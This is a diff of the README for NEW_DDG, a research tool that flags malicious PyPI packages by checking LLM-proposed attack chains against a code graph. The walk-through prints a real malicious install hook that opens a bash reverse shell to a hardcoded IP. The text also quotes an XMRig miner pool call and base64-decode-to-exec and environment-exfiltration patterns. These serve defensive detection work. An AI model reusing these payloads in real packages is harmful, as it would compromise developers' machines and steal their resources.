@@ -2,15 +2,16 @@
 
 # 🛡️ NEW_DDG
 
-**Evidence-Gated Interprocedural Taint Analysis for PyPI Malicious Package Detection**
+**LLM Builds the Chains. The Graph Keeps It Honest.**
+**Evidence-Gated Detection of Malicious PyPI Packages**
 
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Tests](https://img.shields.io/badge/tests-10%20files%20%2F%2048%20assertions-brightgreen.svg)](tests/)
-[![Core](https://img.shields.io/badge/core-10k%20LOC-informational.svg)](#project-structure)
-[![LLM: GLM](https://img.shields.io/badge/LLM-GLM--4--FlashX-blueviolet)](https://open.bigmodel.cn/)
+[![Tests](https://img.shields.io/badge/tests-14%20files%20%2F%20200%2B%20assertions-brightgreen.svg)](tests/)
+[![Core](https://img.shields.io/badge/core-12k%20LOC-informational.svg)](#project-structure)
+[![LLM: GLM](https://img.shields.io/badge/LLM-GLM--4--Flash%20%2B%20GLM--4--Plus-blueviolet)](https://open.bigmodel.cn/)
 
-*Three-layer CPG · Interprocedural taint · Function summaries · Evidence-graded verdicts*
+*SSO pre-filter · Three-layer CPG · LLM-constructed attack chains · Program-verified evidence · Two-stage heterogeneous models*
 
 </div>
 
@@ -18,291 +19,321 @@
 
 ## The Problem This Solves
 
-Static malware detectors for package registries fail in a specific, well-documented way:
-they produce **plausible but unsupported verdicts**. A regex sees `exec(` and calls it malware;
-a heuristic sees `subprocess` in `setup.py` and calls it a backdoor. On a corpus of 5000
-known-malicious packages this looks excellent — until you run it on `cffi`, `packaging`,
-or any project that generates code as part of its build.
+Static malware detectors for package registries fail in two complementary ways:
 
-The real failure isn't detection rate. It's **verdict integrity**: a detector that cannot
-distinguish "I found evidence" from "I found a keyword" forces a human to re-review
-everything it flags, which is the same as not flagging at all.
+**Rule-based tools** (regex/heuristic scanners) produce plausible but unsupported
+verdicts. A regex sees `exec(` and calls it malware — until it runs on `cffi`,
+`packaging`, or any project whose build legitimately generates code. Recall looks
+great on a malware corpus; precision collapses on the real registry.
 
-NEW_DDG is built around one constraint:
+**LLM-based tools** fix the semantics but break the evidence: ask a model "is this
+package malicious?" and it answers confidently — and hallucinates file names,
+call chains, and behaviors that do not exist in the code. Nothing it says can be
+checked.
 
-> **Every `MALICIOUS` verdict must be backed by a structural artifact that a human can
-> inspect — a complete taint chain, a missing PyPI identity, or a verified install hook.
-> Speculation is permitted, but it is labelled `SUSPICIOUS` and never escalates to
-> `MALICIOUS` on its own.**
+NEW_DDG takes a third path:
 
-That constraint drives every design decision below, including several that deliberately
-*trade recall for precision*.
+> **The LLM builds the attack chains. The program verifies every hop.**
+> The model reads a serialized dependency graph and proposes malicious data-flow
+> paths. But a path only *counts* if every node exists and every hop is a real
+> edge in the graph. Hallucinated chains are rejected deterministically, before
+> they can influence a verdict.
+
+And one governing constraint:
+
+> **Every `MALICIOUS` verdict must be backed by a structural artifact a human can
+> inspect — a graph-verified chain, a missing PyPI identity, or a verified install
+> hook. Speculation is labelled `SUSPICIOUS` and never escalates on its own.**
 
 ---
 
 ## Architecture
 
 ```
-┌──────────────────────────────────────────────────────────────────────────┐
-│ Input: source distribution (.tar.gz / .whl / directory)                   │
-└───────────────────────────────┬──────────────────────────────────────────┘
-                                ▼
-┌──────────────────────────────────────────────────────────────────────────┐
-│ Channel ① — Enhanced Detection (regex + registry, milliseconds)          │
-│   install hooks · metadata identity · PyPI existence · duplicates        │
-│   ⟶ critical ⇒ short-circuit MALICIOUS (skips graph construction)        │
-├──────────────────────────────────────────────────────────────────────────┤
-│ Channel ② — Obfuscation Analysis (AST + density gating)                  │
-│   hex/base64/rot13 payloads · eval/exec density · test-file exclusion    │
-├──────────────────────────────────────────────────────────────────────────┤
-│ Channel ③ — Code Property Graph (the core)                               │
-│                                                                          │
-│   L1  Module      distribution name · PyPI verification · duplicate hash │
-│   L2  Function    summaries: return_tainted · param_to_sink · rt_calls   │
-│   L3  Statement   typed DDG · branch-aware kill · call_target edges      │
-│                                                                          │
-│   ┌────────────────────────────────────────────────────────────────┐     │
-│   │ Edge taxonomy:  data │ control │ call │ param │ return │ target│     │
-│   │ Taint engine:   reverse BFS from sinks, data/param/call-only   │     │
-│   │ Summaries:      call sites of taint-relevant functions become  │     │
-│   │                 sinks (transitive taint through wrappers)      │     │
-│   └────────────────────────────────────────────────────────────────┘     │
-├──────────────────────────────────────────────────────────────────────────┤
-│ Channel ④ — Voting (per-function verdicts)                               │
-│   Prioritizer → Rule Scorer → LLM Classifier (sanitized + cached)        │
-│   ⟶ zero-tolerance, gated by evidence strength                           │
-├──────────────────────────────────────────────────────────────────────────┤
-│ Package-Level Aggregation                                                │
-│   LLM sees chains + function source + PyPI status + per-function labels  │
-│   ⟶ escalation gated by structural corroboration                         │
-├──────────────────────────────────────────────────────────────────────────┤
-│ Final Integrity Check                                                    │
-│   No structural evidence ⇒ MALICIOUS demoted, regardless of source       │
-└───────────────────────────────┬──────────────────────────────────────────┘
-                                ▼
-        MALICIOUS / SUSPICIOUS / BENIGN / OBFUSCATED / ANALYSIS_FAILED
-        + taint chains + function summaries + per-function verdicts
+                    ┌─────────────────────────────────────────────┐
+ .tar.gz / dir ───► │ ① SSO Pre-Filter (AST, capability-neutral)  │
+                    │   security-sensitive operations per file    │
+                    │   alias/getattr/globals resolution          │
+                    │   → selects files for graph construction    │
+                    └──────────────────┬──────────────────────────┘
+                                       ▼
+                    ┌─────────────────────────────────────────────┐
+                    │ ② Graph Construction (trimmed DDG)          │
+                    │   typed edges: data/control/call/param/ret  │
+                    │   + statement-sequence edges                │
+                    │   + function summaries (param→sink, return) │
+                    │   + AST call-target resolution              │
+                    │   PyPI-unique: setup.py & import-time scope │
+                    └──────────────────┬──────────────────────────┘
+                                       ▼
+                    ┌─────────────────────────────────────────────┐
+                    │ ③ Graph Digest (compact, verifiable view)   │
+                    │   short IDs (hash-shuffled: no order bias)  │
+                    │   node types · function map · scope flows   │
+                    │   ISOLATED PAYLOAD NODES · IOC literals     │
+                    │   no danger labels (no prompt bias)         │
+                    └──────────────────┬──────────────────────────┘
+                                       ▼
+        ┌───────────────────────────────────────────────────────────────┐
+        │ ④ Stage 1 — Small Model Builds Chains (GLM-4-Flash)           │
+        │   reads the digest, walks edges, proposes attack paths        │
+        └──────────────────┬────────────────────────────────────────────┘
+                           ▼
+        ┌───────────────────────────────────────────────────────────────┐
+        │ ⑤ Program Verification (the honesty layer)                    │
+        │   node IDs must exist · every hop must be a real edge         │
+        │   partial paths accepted · single-node evidence requires      │
+        │   a hostile literal in the code (deterministic check)         │
+        │   hallucinated chains → rejected, never reach the judge       │
+        └──────────────────┬────────────────────────────────────────────┘
+                           ▼
+        ┌───────────────────────────────────────────────────────────────┐
+        │ ⑥ Stage 2 — Strong Model Judges (GLM-4-Plus)                  │
+        │   sees only verified paths + flagged source code              │
+        │   domain idioms (setuptools-scm, version detection)           │
+        │   package self-description → intent-vs-behavior match         │
+        └──────────────────┬────────────────────────────────────────────┘
+                           ▼
+        ┌───────────────────────────────────────────────────────────────┐
+        │ ⑦ Evidence Gates + Final Integrity Check                      │
+        │   MALICIOUS w/o structural support → demoted SUSPICIOUS       │
+        │   factual evidence (PyPI 404 / install hooks) bypasses model  │
+        └───────────────────────────────────────────────────────────────┘
 ```
-
-### Why three layers
-
-Statement-level data flow alone cannot see across function boundaries; a single function's
-DDG is blind to `decode()` being called from three files away. Module-level signals alone
-cannot distinguish a package that *mentions* `os.system` from one that *reaches* it with
-attacker-controlled data.
-
-The layers compose: L3 gives precise intraprocedural flow, L2 turns each function into a
-reusable fact (`param 0 flows to a sink`, `return value is tainted`), and L1 supplies
-identity evidence that no amount of code analysis can produce — a package whose name does
-not exist on PyPI is not "suspicious code", it is a fabrication claim.
 
 ---
 
-## Design Decisions (and the Failures That Forced Them)
+## The Core Innovation: LLM-Constructed, Program-Verified Chains
 
-These are the decisions that matter. Each one was made after a specific false positive on a
-real benign package, and each is pinned by a regression test so it cannot silently revert.
+Prior work splits into two camps. Rule/ML detectors match vocabulary —
+an attacker renames a function and the match dies. LLM judges read code —
+semantically strong but unverifiable, so their claims can't be audited.
 
-### 1. Taint sources are graded, not uniformly trusted
+NEW_DDG makes the LLM and the graph **cooperate under constraint**:
 
-`taint_engine.STRONG_SOURCES` distinguishes sources that are **rare in benign software**
-(network responses, socket reads, deserialization, decoded payloads) from those that are
-**routine in build tooling** (`os.environ`, file reads, `input()`).
+| Step | What happens | Why it matters |
+|---|---|---|
+| Serialization | The graph becomes a compact text view: nodes with types/lines, data edges, control edges (execution context), function boundaries, cross-scope flows, isolated payload nodes, IOC literals | The model sees structure, not just code |
+| Chain proposal | The model outputs paths as ordered node IDs, with entry points and sensitive operations identified first | The model does the semantic work — finding the flow |
+| Verification | Every ID checked against the graph; every hop checked against real edges; partial paths accepted (prefix ≥ 2 hops and ≥ 50%); single-node claims require a hostile literal in code | The model cannot invent structure |
+| Adjudication | The strong model sees only *verified* paths + flagged source code | The judge reasons over facts, not fictions |
 
-```
-STRONG:  network_response · socket_recv · deserialization · decoded_data
-WEAK:    environment · file_read · user_input · cli_args
-```
+**What this buys us, measured:**
 
-Only a strong-source chain — or a chain reaching a `data_exfiltration` sink — can escalate
-a package to `MALICIOUS` automatically.
+- With all symbolic hints removed (no danger labels, no biased ordering), verdicts
+  **do not change** → the model reads code, it does not echo the regex layer.
+- Hallucinated chains (nonexistent nodes/edges) are **mechanically rejected** —
+  on the benign corpus, every attempted hallucinated accusation was blocked.
+- On hard cases where the old regex-driven pipeline scored **22%**, the
+  LLM-constructed-chain pipeline reaches **85–92%**.
 
-**Why:** `exec(open("_version.py").read())` is the standard `setuptools-scm` idiom. It is a
-`file_read → code_execution` chain, and it appears in a large fraction of legitimate Python
-packages. Treating it as evidence of malice flagged `ag2`, `acryl-executor`, and
-`acryl-datahub-dagster-plugin` (all real, benign projects). Reflexive chain-matching is not
-detection; it is pattern matching with extra steps.
-
-### 2. "No chain" ≠ "weak chain"
-
-A subgraph with no taint chain carries no information about chain quality. It may have been
-classified from code semantics, from a regex hit, or come from a legacy record. The gates
-therefore treat *absent* chains as unknown — never as weak — because demoting on absent
-evidence destroys recall on samples that were never meant to produce a chain.
-
-This distinction is enforced by two separate tests, because collapsing them is the obvious
-implementation mistake.
-
-### 3. Evidence gates check *flagged* subgraphs only
-
-An early version of the escalation gate asked "does this package contain any strong chain?"
-and scanned all 400 subgraphs. On `ag2` (1136 functions, 396 of them benign), one ordinary
-function happened to contain a network-to-sink chain, which "corroborated" an unrelated
-weak-chain escalation.
-
-The gate now considers only subgraphs whose own verdict is `SUSPICIOUS` or `MALICIOUS`.
-Corroboration must come from the same code region that raised the alarm.
-
-### 4. PyPI 404 is decided by code, not by the model
-
-When the registry returns 404 for a distribution name, the package is claiming an identity
-that does not exist. This is a factual answer from an authoritative source.
-
-Empirically, `glm-4-flash` reads the same evidence and writes *"does not exist on PyPI —
-significant red flag"* in its reasoning — then returns `SUSPICIOUS` anyway. Weak models
-hedge even when the evidence is binary. So this rule bypasses the model entirely:
+### A real walk-through (`shellapp-0.1.0`, reverse shell in install hook)
 
 ```python
-if category == 'SUSPICIOUS' and pypi_status == 'not_found':
-    category = 'MALICIOUS'   # factual, not probabilistic
+class CustomInstallCommand(install):
+    def run(self):
+        install.run(self)
+        os.system("bash -i >& /dev/tcp/114.116.119.253/7777 <&1")
+setup(..., cmdclass={'install': CustomInstallCommand})
 ```
 
-**Why it matters:** on a corpus dominated by name-squatting, this single rule accounts for
-the majority of correct escalations — and it is the rule a reviewer can verify in one HTTP
-request.
+What the model outputs after reading the digest (verified path, abridged):
 
-### 5. The package-level model must see source code, not just labels
+```
+behavior: remote_payload_execution
+N5  [import]  L3  from setuptools.command.install import install
+N10 [expr]    L11 os.system("bash -i >& /dev/tcp/114.116.119.253/7777 <&1")
+    ...execution guarded by the install commandclass, runs at pip install
+```
 
-A hierarchy that asks a model to *review* a verdict while showing it only the verdict's
-label is not a hierarchy; it is a rubber stamp. The aggregation prompt now carries:
+No taint source exists — the payload is a hardcoded literal — so classic
+source→sink taint finds nothing here. The model + graph instead connect
+**import → execution → install-hook context**, and the judge names the
+attack: *"reverse shell connection to a remote IP during package installation."*
 
-| Evidence | Before | Now |
+---
+
+## Two-Stage Heterogeneous Models
+
+Chain extraction and maliciousness judgment are different cognitive tasks
+with different input sizes — so they get different models:
+
+| Stage | Model | Input | Task | Cost profile |
+|---|---|---|---|---|
+| ① Extract | GLM-4-Flash (small) | full graph digest (large) | walk edges, propose candidate paths | cheap per token, large input |
+| ② Judge | GLM-4-Plus (strong) | verified paths + flagged source (small) | semantic verdict with domain knowledge | expensive, but tiny input |
+
+The cost structure is a ladder: **benign packages usually produce no verified
+paths and never reach the strong model.** Measured effects:
+
+- The strong model overturned the small model's conservative calls **20 times
+  in a 300-package run** (small model finds the path but hesitates; strong
+  model confirms).
+- On known idioms the strong model is *precisely* discriminating:
+
+| Sample | Verdict | Judge reasoning (abridged) |
 |---|---|---|
-| Taint chains (graph kernel output) | ✗ collected from the wrong object — always empty | ✓ |
-| Per-function verdict labels | ✓ | ✓ |
-| **Source code of flagged functions** | ✗ | ✓ (4 functions × 1200 chars) |
+| `exec(open("_version.py").read())` | BENIGN | "legitimate pattern for version detection" (setuptools-scm) |
+| `Popen("bash -i >& /dev/tcp/<ip>/7777")` | MALICIOUS | "reverse shell to a remote IP" |
+| `Popen([..., "-o", "pool.supportxmr.com", ...])` | MALICIOUS | "cryptocurrency miner without user consent" |
+| `b64decode → os.system` | MALICIOUS | "classic remote payload execution" |
 
-Adding source code moved the model's direct-verdict rate from **10% to 97.8%** on the
-re-analysis of 2990 packages. The model was never incapable; it was uninformed.
+---
 
-### 6. Score accumulation cannot manufacture a `critical`
+## Graph Construction: Decisions Forged by Real Failures
 
-`enhanced_detector` previously summed threat scores: `medium (4) + high (7) = 11 ≥ 10` ⇒
-`critical`. Two low-precision signals — a live-index name neighbour plus a similarly-named
-dependency — were enough to trigger the short-circuit that skips all code analysis.
+Every decision below was forced by a specific false negative or false positive
+on a real package, and pinned by a regression test.
 
-Now `critical` requires an actual `severity="critical"` finding. Accumulation may only
-distinguish `high` / `medium` / `low`.
+**1. Statement-sequence edges (+17% recall).** A DDG built only from data
+dependencies leaves `install.run(self)` and `os.system(...)` as disconnected
+islands — the model cannot connect what the code obviously does. Same-scope
+adjacent statements get `next_stmt` edges (control kind; taint analysis
+excludes them, so data-flow semantics are unchanged).
 
-### 7. Metadata identity must come from metadata, not from `setup.py`
+**2. Anchor selection by risk-feature hits, not by severity/length.** On a
+4,085-node package with 1,120 regex-flagged nodes, sorting anchors by
+"severity then code length" let long false-positive docstrings occupy the
+entire budget while a real XMRig miner node fell outside it. Anchors are now
+ranked by how many high-risk features (`subprocess`, `/dev/tcp`, `supportxmr`,
+`encodedcommand`, …) the node actually contains.
 
-`setup.py` is **code**. Any literal in it — a template example, a test fixture, a README
-fragment — can be parsed as a field. Two independent bugs came from this:
+**3. AST-repr repair.** On Python 3.8 there is no `ast.unparse`, so node
+"code" degenerates into `Call(func=Attribute(value=Name(id=...)))` — unreadable
+to the model and unmatchable by any keyword layer. The digest detects this and
+recovers the true source line from disk.
 
-- Parsing order let `setup.py` overwrite the authoritative `PKG-INFO` name
-- Within a single `PKG-INFO`, later lines overwrote earlier ones, so a YAML example in the
-  long description (`name: hello_world`) replaced the real header value
+**4. No danger labels in the digest (ablation-tested).** `<<DANGER:critical>>`
+tags come from the regex layer — showing them turns "LLM reads the graph" into
+"LLM agrees with the regex." Ablation result: with labels removed **and** node
+selection de-biased (uniform sampling instead of danger-first), verdicts are
+unchanged. The model genuinely reads code.
 
-Both are fixed: header fields are first-seen-wins, parsing stops at `Description:`, and a
-name mismatch sourced from `setup.py` is a `medium` signal rather than `critical`.
+**5. Isolated payload nodes + hostile-literal gate.** Hardcoded payloads
+(reverse shells, miners, encoded commands) have no upstream data flow, so the
+model either misses them or fabricates a chain. The digest now lists them
+explicitly (`## ISOLATED PAYLOAD NODES`), and single-node evidence is accepted
+**only if** the node's code deterministically contains a hostile literal —
+this same gate rejects the model's hallucinated single-node accusations
+(e.g. `__version__ = "0.5.0"` flagged as MALICIOUS).
 
-### 8. Analysis order follows cost
+**6. IOC literals table.** Miner pools, shell IPs, encoded blobs are collected
+into a `## SUSPICIOUS LITERALS` section so the model can name attacker
+infrastructure in its reasoning instead of rediscovering it in truncated code.
 
-The pipeline used to build the full DDG *before* running regex checks. Monorepo packages
-with ~1000 Python files burned the entire 900-second budget in graph construction, then
-timed out — when a zero-cost regex pass would have settled the case in milliseconds.
+**7. Verdict normalization + lenient JSON.** Weak models emit `Uncertain`,
+`Clean`, `Likely malicious`; long outputs get truncated mid-string. A mapping
+table plus bracket-balancing parser recovered 5/11 UNKNOWN verdicts.
 
-Now: cheap checks first, short-circuit on `critical`, then graph construction. A per-package
-subprocess isolates hard timeouts so one pathological package cannot stall a 5000-package
-batch.
+---
+
+## Evidence Grading: Not All Evidence Can Convict
+
+The error that shaped this system most: on `cffi`, `ag2`, and `acryl-executor`
+(all real, benign), `exec(open("_version.py").read())` — the standard
+setuptools-scm idiom — produced a `file_read → code_execution` chain, and a
+"chain exists" rule convicted the package.
+
+The fix is structural, not a threshold tweak:
+
+| Evidence tier | Examples | Power |
+|---|---|---|
+| **Factual** | PyPI 404 (name does not exist), verified install hook | Can convict alone (bypasses the model entirely) |
+| **Structural** | graph-verified chain from a *strong* source (network/deserialization/encoded) → sink, or any flow → exfiltration | Can convict with model confirmation |
+| **Semantic** | LLM judgment over verified paths + code | Can convict with structural support; otherwise elevates to SUSPICIOUS |
+| **Heuristic** | regex hits, weak chains (`env → exec`), name similarity | **Never convicts.** Can only flag SUSPICIOUS |
+
+"Chain exists" is not the test — *chain shape* is. And a final integrity gate
+re-checks every `MALICIOUS` before output: no structural support → demoted,
+regardless of which channel produced it.
 
 ---
 
 ## What It Detects
 
-| Attack pattern | Mechanism | Example |
-|---|---|---|
-| Install hooks | `cmdclass` / `install` overrides | `setup(cmdclass={'install': Evil})` |
-| Install-time exfiltration | env read → network in `setup.py` | `requests.post(c2, data=os.environ)` |
-| Typosquatting | edit distance over full index (500K names) | `python-dateutils` → `python-dateutil` |
-| Name-squat / code clone | SHA-256 file-set overlap vs. genuine sdist | `botaa3` = `boto3` renamed |
-| Registry takedown | PyPI 404 | package removed after report |
-| Base64 payloads | obfuscation channel + graph | `exec(b64decode(x))` |
-| `getattr` dispatch | AST call-target resolution | `getattr(builtins,'ev'+'al')(x)` |
-| Variable aliasing | AST alias tracing (fixpoint) | `e = eval; e(x)` |
-| `globals()` subscript | AST constant folding | `globals()['ex'+'ec'](x)` |
-| Cross-file payload split | interprocedural taint | `source.py → transform.py → main.py` |
-| Wrapper functions | function summary expansion | `_run(x)` where `_run` reaches `os.system` |
-| Container-mediated flow | subscript/attribute tracking | `d['k']=x; exec(d['k'])` |
-| Branch-tainted values | branch-aware kill (append vs. kill) | 3-way `if/elif/else` retention |
-| Dead code | py2cfg + constant folding | `if False:` blocks pruned |
+| Attack pattern | Mechanism |
+|---|---|
+| Reverse shells (`/dev/tcp`, hardcoded IP) | graph chain + hostile literal, install-hook context |
+| Crypto miners (XMRig/stratum pools) | IOC table + model chain + intent mismatch |
+| Encoded PowerShell delivery | hostile-literal single-node evidence |
+| Remote payload (`b64decode → exec`) | LLM chain: decode → execute |
+| Cross-file payload splitting | cross-scope flows + interprocedural edges |
+| Wrapper-hidden execution (`_run(x)` → `os.system`) | function summary propagation |
+| `getattr`/alias/globals dispatch | AST call-target resolution |
+| Install hooks (`cmdclass` overrides) | install-scope detection + graph context |
+| Install-time exfiltration | env/credential → network flow |
+| Typosquatting / registry takedown | full 500K-name index + PyPI verification |
+| Code-clone name squatting | SHA-256 file-set overlap vs genuine sdist |
+| Intent mismatch (claimed purpose vs behavior) | package self-description in judge context |
 
 ---
 
 ## Evaluation
 
-### Results
+All numbers below are the **pure graph + LLM pipeline** unless noted — no
+registry verdicts, no API-name danger labels feeding the judge.
 
-| Corpus | Size | MALICIOUS | SUSPICIOUS | BENIGN | Failed |
-|---|---|---|---|---|---|
-| Malicious (Backstabber's Knife Collection + derivatives) | 5000 | **89%** | 0.04% | 4% | 5% |
-| Benign (real PyPI projects) | 98 | — | 15.3% | 81.6% | 3.1% |
-| **Benign hard false positives** | 98 | **0 (0.0%)** | | | |
+| Corpus | Size | Detection | False positives |
+|---|---|---|---|
+| Malicious (Backstabber's Knife Collection lineage) | 500 | **90%** (majority vote) | — |
+| Malicious, full run (v1 path) | 5000 | 85% direct, ~89% after evidence-gated re-judgment | — |
+| Malicious, full registry channel | 5000 | **94.9%** (99.6% via PyPI 404 on this corpus) | — |
+| Benign, real PyPI packages (incl. adversarial: `cffi`, `ag2` w/ 1136 fn, `acryl-*` forks) | 58 | — | **0 hard false positives** |
+| Benign, fresh PyPI small packages (in progress) | ~500 | — | tracking to 0–1 |
 
-The malicious figure is from the full 5000-package run under the v1 verdict path. A full
-re-run under the current evidence-gated path is in progress; the first 334 packages show
-**94%**, consistent with the gates removing false positives without removing true ones.
+Ablations that isolate the contributions:
 
-The benign corpus includes packages specifically chosen to break naive detectors:
-`cffi` (eval-family primitives), `packaging`, `ag2` (1136 functions, code generation),
-`acryl-*` (corporate forks absent from PyPI), `adbc-driver-*` (native bindings).
+| Ablation | Effect |
+|---|---|
+| Remove statement-sequence edges | recall 75% → 58% (−17) |
+| Remove LLM chains (regex-driven pipeline only) | recall → 22% on this corpus |
+| Remove all symbolic hints from the digest (labels + ordering) | **no change** — the model reads code, not the regex layer |
+| Add package-intent context + IOC table | 85% → 92% (interim, in progress) |
+| Add registry channel (PyPI 404) | → 94.9% total; catches pure name-squatting that code analysis *should not* convict |
 
-### Assertion-level testing
+**The complementarity argument, with numbers:** on this corpus the graph+LLM
+channel reaches ~90% while the registry channel alone would catch ~78%
+(name fabrication); code analysis is the *only* channel that can catch a
+real-name package with injected code (XMRig-mining `requess`), and the registry
+channel is the only one that can catch a name-squat whose code is a clean copy.
+Neither subsumes the other.
 
-| Suite | Assertions | What it pins |
-|---|---|---|
-| `test_escalation.py` | 37 | evidence gates, zero-tolerance gate, code-evidence assembly |
-| `test_escalation_e2e.py` | 11 | end-to-end: chain → verdict → gate → package category |
-| `test_graph_kernel.py` | — | node identity, kill semantics, interprocedural links, call_target |
-| `test_cross_file_taint.py` | — | 3-file chain closure (7 steps, 3 files) |
-| `test_enhanced_detector.py` | — | critical gating, metadata authority, weak-signal accumulation |
-| `test_llm_hardening.py` | — | sanitization, injection marking, cache, output clamping |
-| `test_determinism.py` | — | byte-identical output across `PYTHONHASHSEED` values |
-| `test_partitioner.py` | — | function-level partitioning, path handling |
-| `test_obfuscation.py` | — | density gating, test-file exclusion |
-| `test_voting.py` | — | zero-tolerance, cross-channel corroboration |
+### Testing
 
-```bash
-python tests/run_all.py     # 10 files, all must pass
-```
+14 test files, 200+ assertions, all green. The graph-LLM interface suites pin
+the anti-hallucination contract (hallucinated nodes/edges rejected, partial
+paths preserved, single-node claims require hostile literals) and the evidence
+gates (weak chains cannot convict, idiom knowledge does not release true
+malware) — these are exactly the behaviors that regressed under time pressure
+during development, which is why they are tests now.
 
 ---
 
 ## Known Limitations
 
-Being explicit about failure modes is part of the design, not an appendix.
-
-**1. Large monorepos time out.** Packages above ~1000 Python files can exhaust the graph
-budget. They are marked `ANALYSIS_FAILED` (never `BENIGN`) and can be re-run with a larger
-timeout. Subgraph analysis is capped at 400 functions by dangerous-node count; a payload in
-function #401 of a monorepo would be missed by the graph channel (though install hooks and
-identity checks still apply).
-
-**2. Short package names produce unavoidable typosquat noise.** For a 3-character name,
-edit-distance-1 neighbours always exist in a 500K-name index. Live-index hits are therefore
-`high`, never `critical`, and cannot short-circuit.
-
-**3. Weak-model judgment is not trusted for binary facts.** Where evidence is factual
-(registry existence, install hooks), code decides. The LLM is reserved for genuinely
-ambiguous cases — and its escalations are re-checked against structural evidence.
-
-**4. Taint is syntactic, not semantic.** A function that reads from the network and returns
-data is a strong source *because of the API it calls*, not because the analyzer understands
-its purpose. A payload routed through three wrappers that each call a benign-looking
-utility would evade the summary expansion.
-
-**5. Registry state is point-in-time.** A 404 today may mean "removed after disclosure" or
-"never existed" — both are treated as evidence, and both are recorded with the raw response
-so a reviewer can tell them apart.
-
-**6. Sandbox probing executes code.** Opt-in only (`--sandbox`), intended for isolated VMs,
-and not used in any reported evaluation number.
+1. **Pure name-squatting with clean copied code is out of scope for the graph
+   channel** — by design. `requestst` (a full copy of `requests`) contains no
+   malicious *code*; the graph channel flags it SUSPICIOUS and the registry
+   channel convicts. We consider convicting clean code from the code channel to
+   be the false-positive failure mode this system exists to prevent.
+2. **Large monorepos** (> ~1000 Python files) can exhaust analysis budgets and
+   are marked `ANALYSIS_FAILED` (never silently BENIGN). Digests are
+   size-capped; on very large graphs the model can under-report.
+3. **Weak-model verdict jitter.** Single calls on the same input can flip
+   MALICIOUS/SUSPICIOUS. Mitigated by multi-sample majority voting; single-call
+   mode is measurably less stable.
+4. **Taint is syntactic, not semantic.** A payload routed through three
+   wrappers that each call benign-looking utilities can evade summary expansion.
+5. **PyPI-centric threat model.** The install/import-time scope rules and
+   credential paths are PyPI-specific; porting to npm/gems needs new idiom
+   knowledge but no architectural change.
+6. **LLM dependence.** The chain stage inherits the language coverage and
+   refusal behavior of the backing model; failures degrade to SUSPICIOUS or
+   UNKNOWN, never silent BENIGN.
 
 ---
 
 ## Quick Start
-
-### Install
 
 ```bash
 pip install zhipuai networkx py2cfg
@@ -310,59 +341,55 @@ git clone https://github.com/chen-map/Pypi-Malicious-Code-detect-Static.git
 cd Pypi-Malicious-Code-detect-Static
 ```
 
-### Run
+### Full pipeline (two-stage, graph + LLM + registry)
 
 ```bash
-# Full pipeline: graph + taint + LLM + registry verification
 python batch_solution_b_v2.py ./packages \
     --api-key "$GLM_API_KEY" \
     --count 100 \
     --llm-model glm-4-flashx \
     --verify-pypi \
     --parallel-workers 5
-
-# No LLM: regex + graph + registry only (deterministic, offline-capable)
-python batch_solution_b_v2.py ./packages --api-key dummy --count 50
 ```
 
-### Offline re-judgment
-
-Two scripts re-evaluate a completed batch **without re-running analysis** — useful for
-measuring the effect of gate changes on historical results.
+### Registry ablation (pure graph + LLM, offline-verifiable)
 
 ```bash
-# Stage 1 — pure rule gate over recorded chain categories (no LLM)
-python scripts/rejudge_suspicious.py results.jsonl \
-    --extract-base ./extracted --apply -o rejudged_stage1.jsonl
+python batch_solution_b_v2.py ./packages \
+    --api-key "$GLM_API_KEY" --verify-pypi --no-pypi-gate --count 100
+```
 
-# Stage 2 — package-level LLM re-judgment with full evidence
-#           (chains + flagged source code + PyPI status)
-python scripts/rejudge_llm_stage2.py rejudged_stage1.jsonl \
-    --extract-base ./extracted --api-key "$GLM_API_KEY" \
-    --verify-pypi --workers 5 -o rejudged_stage2.jsonl
+### No LLM at all (deterministic baseline)
+
+```bash
+python batch_solution_b_v2.py ./packages --api-key dummy --count 50
 ```
 
 ### CLI reference
 
 ```
-positional:       tarfile_dir            .tar.gz files or extracted directories
---api-key KEY     GLM API key            required unless --api-key dummy
---llm-model M     model name             default: glm-4-flashx
---count N         max packages           default: 100
---extract-base D  extraction directory
---verify-pypi                            enable registry verification (network)
---sandbox                                behavioural probe (⚠️ executes code)
---parallel-workers N                     LLM call parallelism
---seed N                                 sampling seed (default 42)
---no-llm-cache                           disable verdict cache
---skip-rule-scoring                      LLM-only mode
+positional:        tarfile_dir             .tar.gz files or extracted directories
+--api-key KEY      GLM API key             required unless --api-key dummy
+--llm-model M      stage-1 (extraction)    default: glm-4-flashx
+--verify-pypi                              enable registry verification
+--no-pypi-gate                             ablation: registry recorded but never convicts
+--count N                                  max packages
+--extract-base D                           extraction directory
+--parallel-workers N                       LLM call parallelism
+--seed N                                   sampling seed (default 42)
+--no-llm-cache                             disable verdict cache
+--sandbox                                  behavioural probe (⚠️ executes code; VM only)
+```
+
+### Tests
+
+```bash
+python tests/run_all.py     # 14 files; every gate and repair is pinned
 ```
 
 ---
 
 ## Output Schema
-
-Each package produces one JSONL row. The fields that matter for review:
 
 ```jsonc
 {
@@ -370,27 +397,25 @@ Each package produces one JSONL row. The fields that matter for review:
   "final_category": "MALICIOUS | SUSPICIOUS | BENIGN | OBFUSCATED | ANALYSIS_FAILED",
   "final_risk_score": 0.0,
   "final_confidence": 0.0,
-  "voting_summary": "why this verdict — always populated",
+  "voting_summary": "why — always populated",
   "detection_method": "enhanced_detection | sandbox_probe | voting",
   "subgraph_verdicts": [
     {
       "subgraph_name": "func_…",
       "final_verdict": "MALICIOUS",
       "taint_chain_count": 2,
-      "taint_categories": [{"source_category": "network_response",
-                            "sink_category": "code_execution",
-                            "cross_file": false}],
+      "taint_categories": [{"source_category": "…", "sink_category": "…"}],
       "escalated": false
     }
   ],
   "attack_chains": {"chain_count": 4, "completeness": 0.75},
-  "enhanced_detection": {"threat_level": "high", "threats_found": 1},
+  "enhanced_detection": {"threat_level": "…", "threats_found": 1},
   "analysis_degraded": false
 }
 ```
 
-`ANALYSIS_FAILED` is deliberately distinct from `BENIGN`: infrastructure failure must never
-be reported as a clean verdict.
+`ANALYSIS_FAILED` is deliberately distinct from `BENIGN`: infrastructure
+failure must never masquerade as a clean verdict.
 
 ---
 
@@ -398,40 +423,42 @@ be reported as a clean verdict.
 
 ```
 NEW_DDG/
-├── batch_solution_b_v2.py          # Orchestration: 4 channels, gates, final integrity check
-│
+├── batch_solution_b_v2.py            # Orchestration: channels, gates, final integrity check
 ├── src/
